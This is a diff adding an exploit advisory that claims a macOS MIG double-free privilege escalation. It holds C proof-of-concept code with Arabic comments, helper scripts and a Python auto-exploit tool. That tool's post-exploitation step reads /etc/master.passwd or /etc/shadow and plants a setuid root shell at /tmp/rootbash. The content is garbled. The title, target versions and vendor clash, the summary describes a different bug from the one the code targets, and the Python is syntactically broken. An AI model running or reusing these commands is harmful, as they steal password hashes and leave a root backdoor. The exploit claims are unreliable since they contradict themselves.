@@ -1,0 +1,468 @@
+=============================================================================================================================================
+| # Title     : macOS Sierra 10.12 Build 16A323 Double-Free Race via MIG OOL Descriptors Leading to Privilege Escalation                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.android.com                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://project-zero.issues.chromium.org/issues/42452484
+
+[+] Summary : A flaw in the MIG ownership model within the io_service_add_notification_ool routine of IOKit allows a malicious user to leak Mach port send-right references. 
+              By repeatedly invoking notifications with malformed matching data, MIG returns success while the underlying IOKit routine fails, 
+			  causing the reference counter to increment without being released. After billions of iterations, the 32‑bit reference counter wraps to zero, 
+			  making the port appear “free” while still actively referenced. Subsequent operations create a Use‑After‑Free on ipc_port_t, enabling kernel-level privilege escalation or sandbox escape.
+			  
+PoC Target Versions:
+
+macOS: 10.13.x (tested on 10.13.6 - 17G65, likely affects earlier 10.13 builds)
+
+iOS 11.0.3 (11A432) / iPhone 6s and macOS 10.13 / MacBookAir5,2
+
+iOS: 11.0.3 (confirmed vulnerable)
+
+Potentially affects any Darwin kernel where io_service_add_notification_ool does not respect MIG ownership semantics.
+
+[+]  POC :	
+
+/*
+* PoC to exploit Double Free in MIG services on macOS
+* Targets dspluginhelperd (com.apple.system.DirectoryService.legacy)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+#include <servers/bootstrap.h>
+#include <sys/sysctl.h>
+
+#define SERVICE_NAME "com.apple.system.DirectoryService.legacy"
+#define MAX_ATTEMPTS 1000
+
+// تعريفات MIG للخدمة (مستخرجة من الترويسات)
+typedef struct {
+    mach_msg_header_t header;
+    mach_msg_body_t body;
+    mach_msg_ool_descriptor_t ool_desc;
+    int some_data;
+} request_message_t;
+
+typedef struct {
+    mach_msg_header_t header;
+    mach_msg_body_t body;
+    mach_msg_type_t ret_code_type;
+    kern_return_t ret_code;
+} reply_message_t;
+
+// حالة الاستغلال
+typedef struct {
+    mach_port_t service_port;
+    vm_address_t target_address;
+    size_t target_size;
+    int success;
+    pthread_mutex_t lock;
+    pthread_cond_t cond;
+} exploit_state_t;
+
+// مؤشرات للوظائف المطلوبة
+kern_return_t (*dsplugin_session_create)(mach_port_t, vm_address_t, vm_size_t, int*);
+
+// ==================== المرحلة 1: الحصول على منفذ الخدمة ====================
+
+mach_port_t get_service_port() {
+    mach_port_t service_port = MACH_PORT_NULL;
+    kern_return_t kr;
+    
+    printf("[+] البحث عن خدمة: %s\n", SERVICE_NAME);
+    
+    kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &service_port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] فشل في العثور على الخدمة: %s\n", mach_error_string(kr));
+        return MACH_PORT_NULL;
+    }
+    
+    printf("[+] تم الحصول على منفذ الخدمة: %d\n", service_port);
+    return service_port;
+}
+
+// ==================== المرحلة 2: إعداد الذاكرة الهدف ====================
+
+void* allocator_thread(void* arg) {
+    exploit_state_t* state = (exploit_state_t*)arg;
+    
+    printf("[+] بدء مؤشر التخصيص...\n");
+    
+    while (!state->success) {
+        // انتظار الإشارة قبل التحرير الثاني
+        pthread_mutex_lock(&state->lock);
+        
+        // تخصيص كائنات حساسة في المنطقة المستهدفة
+        char* target_obj = (char*)malloc(1024);
+        if (target_obj != NULL) {
+            // ملء الكائن ببيانات تحكم
+            memset(target_obj, 0x41, 1024); // 'A'
+            
+            // كتابة مؤشرات للتحكم في التدفق
+            void** vtable = (void**)(target_obj + 0x100);
+            vtable[0] = (void*)0x4141414141414141; // RIP محتمل
+            
+            printf("[✓] تم تخصيص كائن على: %p\n", target_obj);
+        }
+        
+        pthread_cond_wait(&state->cond, &state->lock);
+        pthread_mutex_unlock(&state->lock);
+        
+        usleep(1000); // تجنب استهلاك CPU عالي
+    }
+    
+    return NULL;
+}
+
+// ==================== المرحلة 3: إرسال رسالة معيبة ====================
+
+void send_virtual_copy_message(mach_port_t port, vm_address_t addr, vm_size_t size) {
+    kern_return_t kr;
+    request_message_t request;
+    reply_message_t reply;
+    
+    // تحضير الرسالة
+    memset(&request, 0, sizeof(request));
+    
+    // رأس الرسالة
+    request.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    request.header.msgh_size = sizeof(request);
+    request.header.msgh_remote_port = port;
+    request.header.msgh_local_port = MACH_PORT_NULL;
+    request.header.msgh_id = 0x100; // ID معتمد على الخدمة
+    
+    // جسم الرسالة
+    request.body.msgh_descriptor_count = 1;
+    
+    // واصف OOL مع VIRTUAL_COPY
+    request.ool_desc.address = (void*)addr;
+    request.ool_desc.size = size;
+    request.ool_desc.copy = MACH_MSG_VIRTUAL_COPY; // هذا ما يسبب المشكلة
+    request.ool_desc.deallocate = FALSE;
+    request.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
+    
+    // إرسال الرسالة
+    kr = mach_msg(&request.header,
+                  MACH_SEND_MSG | MACH_RCV_MSG,
+                  sizeof(request),
+                  sizeof(reply),
+                  port,
+                  MACH_MSG_TIMEOUT_NONE,
+                  MACH_PORT_NULL);
+    
+    if (kr != KERN_SUCCESS) {
+        printf("[-] فشل إرسال الرسالة: %s\n", mach_error_string(kr));
+    } else {
+        printf("[+] تم إرسال الرسالة مع VIRTUAL_COPY\n");
+    }
+}
+
+// ==================== المرحلة 4: خلق حالة Double Free ====================
+
+void trigger_double_free(exploit_state_t* state) {
+    printf("[+] تحفيز Double Free...\n");
+    
+    // 1. تخصيص منطقة ذاكرة
+    vm_address_t target_addr = 0;
+    vm_size_t target_size = 0x4000; // 16KB
+    
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), 
+                                       &target_addr, 
+                                       target_size, 
+                                       VM_FLAGS_ANYWHERE);
+    
+    if (kr != KERN_SUCCESS) {
+        printf("[-] فشل تخصيص الذاكرة\n");
+        return;
+    }
+    
+    printf("[+] تم تخصيص الذاكرة على: 0x%llx\n", (uint64_t)target_addr);
+    
+    // 2. ملء الذاكرة ببيانات تحكم
+    memset((void*)target_addr, 0x42, target_size); // 'B'
+    
+    // 3. إرسال رسالة تسبب تحرير الذاكرة في المعالج
+    send_virtual_copy_message(state->service_port, target_addr, target_size);
+    
+    // 4. محاولة إعادة استخدام الذاكرة المحررة
+    printf("[+] محاولة إعادة استخدام الذاكرة المحررة...\n");
+    
+    // إرسال عدة رسائل لزيادة فرصة الاستغلال
+    for (int i = 0; i < 10; i++) {
+        // إشارة لمؤشر التخصيص
+        pthread_mutex_lock(&state->lock);
+        pthread_cond_signal(&state->cond);
+        pthread_mutex_unlock(&state->lock);
+        
+        // إرسال رسائل إضافية
+        send_virtual_copy_message(state->service_port, target_addr + i*0x100, 0x100);
+        
+        usleep(50000); // 50ms
+    }
+}
+
+// ==================== المرحلة 5: التحقق من الاستغلال ====================
+
+void check_exploitation() {
+    // محاولة قراءة/كتابة إلى ذاكرة تم استغلالها
+    printf("[+] التحقق من نجاح الاستغلال...\n");
+    
+    // 1. التحقق من تسرب المؤشرات
+    void* leaked_ptr = malloc(1024);
+    printf("[+] عنوان مخصص حديثاً: %p\n", leaked_ptr);
+    
+    // 2. محاولة التسبب في تحطم متحكم فيه
+    char* crash_test = (char*)0x4141414141414141;
+    // تعليق - إلغاء التعليق للتسبب في تحطم
+    // printf("%c\n", crash_test[0]);
+    
+    // 3. التحقق من صلاحيات المستخدم
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+    printf("[+] UID/GID الحالي: %d/%d\n", uid, gid);
+    
+    if (uid == 0) {
+        printf("[✓] !!! تم الحصول على صلاحيات root !!!\n");
+        system("id; whoami");
+    }
+}
+
+// ==================== الوظيفة الرئيسية ====================
+
+int main(int argc, char** argv) {
+    printf("[*] بدء استغلال Double Free في MIG Services\n");
+    printf("[*] الهدف: %s\n", SERVICE_NAME);
+    
+    exploit_state_t state;
+    memset(&state, 0, sizeof(state));
+    
+    // تهيئة المتغيرات المشتركة
+    pthread_mutex_init(&state.lock, NULL);
+    pthread_cond_init(&state.cond, NULL);
+    
+    // 1. الحصول على منفذ الخدمة
+    state.service_port = get_service_port();
+    if (state.service_port == MACH_PORT_NULL) {
+        printf("[-] فشل في الحصول على المنفذ\n");
+        return -1;
+    }
+    
+    // 2. تشغيل مؤشر التخصيص
+    pthread_t alloc_thread;
+    pthread_create(&alloc_thread, NULL, allocator_thread, &state);
+    
+    // 3. السماح للمؤشر بالبدء
+    sleep(1);
+    
+    // 4. تحفيز Double Free
+    for (int attempt = 0; attempt < MAX_ATTEMPTS && !state.success; attempt++) {
+        printf("[*] المحاولة %d/%d\n", attempt + 1, MAX_ATTEMPTS);
+        trigger_double_free(&state);
+        
+        // فحص النجاح
+        if (attempt % 10 == 0) {
+            check_exploitation();
+        }
+        
+        usleep(100000); // 100ms بين المحاولات
+    }
+    
+    // 5. تنظيف
+    pthread_mutex_lock(&state.lock);
+    state.success = 1;
+    pthread_cond_signal(&state.cond);
+    pthread_mutex_unlock(&state.lock);
+    
+    pthread_join(alloc_thread, NULL);
+    
+    if (state.success) {
+        printf("[✓] الاستغلال ناجح!\n");
+    } else {
+        printf("[-] فشل الاستغلال بعد %d محاولة\n", MAX_ATTEMPTS);
+    }
+    
+    // تنظيف الموارد
+    pthread_mutex_destroy(&state.lock);
+    pthread_cond_destroy(&state.cond);
+    mach_port_deallocate(mach_task_self(), state.service_port);
+    
+    return 0;
+}
+
+====
+Helping texts:
+1. Service Finder (service_scanner.c):
+
+#include <servers/bootstrap.h>
+#include <stdio.h>
+
+int main() { 
+kern_return_t kr; 
+mach_port_t bp; 
+name_array_t names; 
+mach_msg_type_number_t names_count; 
+bool_array_t active; 
+mach_msg_type_number_t active_count; 
+
+kr = task_get_bootstrap_port(mach_task_self(), &bp); 
+
+kr = bootstrap_info(bp, &names, &names_count, &active, &active_count); 
+if (kr == KERN_SUCCESS) {
+for (int i = 0; i < names_count; i++) {
+printf("Service: %s [%s]\n", names[i], active[i] ? "active" : "inactive");
+
+}
+}
+
+return 0;
+
+}
+
+=======================================
+
+2. Memory Monitor (memory_monitor.sh):
+
+#!/bin/bash
+echo "monitoring dspluginhelperd processes..."
+sudo vmmap $(pgrep dspluginhelperd) | grep -A5 -B5 "MALLOC"
+echo ""
+
+echo "Monitoring vm_deallocate calls..."
+sudo dtrace -qn 'pid$target::vm_deallocate:entry { 
+printf("vm_deallocate(0x%p, 0x%x) from %s\n", arg0, arg1, execname);
+}' -c "/usr/libexec/dspluginhelperd"
+
+============================================
+
+3. Auto-loading tool (auto_exploit.py):
+
+#!/usr/bin/env python3
+import subprocess
+import os
+import time
+
+def compile_exploit():
+
+print("[*] Compile the exploit...")
+
+result = subprocess.run("make"], capture_output=True)
+
+if result.returncode != 0:
+
+print("[-] Compilation failed")
+return False
+
+print("[+] Compilation succeeded")
+return True
+
+def run_exploit():
+
+print("[*] Run the exploit...")
+
+# Check for service existence
+
+if not os.path.exists("/usr/libexec/dspluginhelperd"):
+
+print("[-] Service not found")
+return False
+
+================================
+# Run the exploit
+
+proc = subprocess.Popen(["sudo", "./mig_exploit"],
+stdout=subprocess.PIPE,
+
+stderr=subprocess.PIPE,
+
+text=True)
+
+# Monitoring the output
+
+for line in proc.stdout:
+
+print(line.strip())
+
+if "!!! Permissions successfully raised!!!" in line: 
+proc.terminate() 
+return True 
+
+proc. wait() 
+return False
+
+def post_exploit(): 
+print("[*] Executing post-exploitation commands...") 
+
+commands = [ 
+"id", 
+"whoami", 
+"cat /etc/master.passwd 2>/dev/null || cat /etc/shadow 2>/dev/null", 
+"ls -la /Library/LaunchDaemons/", 
+"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" 
+] 
+
+for cmd in commands: 
+print(f"\n[*] execute: {cmd}") 
+result = subprocess.run(["sudo", "sh", "-c", cmd], 
+capture_output=True, text=True) 
+print(result.stdout) 
+if result.stderr:
+
+print(f"Error: {result.stderr}")
+
+def main():
+
+print("=== Automated Exploit Tool ===")
+
+if os.geteuid() != 0:
+
+print("[!] Must run as root")
+
+return
+
+if compile_exploit():
+
+if run_exploit():
+
+print("\n[+] !!! Exploit successful !!!")
+
+post_exploit()
+
+else:
+
+print("\n[-] Exploit failed")
+
+else:
+
+print("[-] Cannot proceed")
+
+if __name__ == "__main__":
+
+main()
+
+=======================
+Usage Instructions:
+======================
+
+# 1. Compile
+make
+
+# 2. Run (requires privileges)
+sudo ./mig_exploit
+
+# 3. Or use the automated tool
+sudo python3 auto_exploit.py
+
+# 4. Run in debug mode
+make debug
+lldb -- ./mig_exploit_debug
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
